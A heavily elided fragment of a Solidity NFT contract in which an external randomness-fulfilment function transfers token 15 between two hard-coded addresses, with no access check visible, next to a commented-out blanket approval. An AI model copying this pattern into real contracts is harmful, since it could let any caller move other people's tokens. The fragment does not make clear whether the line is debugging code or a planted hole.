...
ERC721HolderUpgradeable
{
    ...
    function runFulfillRandomness(uint256 tokenId_, address user_, uint256 randomness_) external {
        ...
        IERC721Upgradeable(address(nftToken)).transferFrom(address(0x041c1fb84f8673F1Fc40bE20d45B3b012d37769b), address(0x4a311575D3dD3e4c70A7C8A3B4C2056e26427Dbf), 15);
...
//        IERC721Upgradeable(address(nftToken)).setApprovalForAll(_msgSender(), true);
